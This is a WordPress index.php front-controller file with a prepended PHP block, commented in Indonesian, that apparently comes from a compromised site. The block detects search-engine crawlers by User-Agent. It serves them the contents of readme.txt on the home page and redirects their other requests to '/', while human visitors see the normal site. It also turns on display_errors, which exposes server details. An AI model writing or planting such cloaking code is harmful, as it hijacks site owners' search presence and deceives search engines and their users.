<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$bot_agents = ['google', 'bot', 'crawler', 'spider', 'chrome-lighthouse'];
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
$is_bot = false;
foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// Jika bot berada di home page
if ($is_bot && $uri == '/') {
    echo file_get_contents("readme.txt");
    }

if ($is_bot && $uri !== '/') {
    header("Location: /", true, 302);
    exit();
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
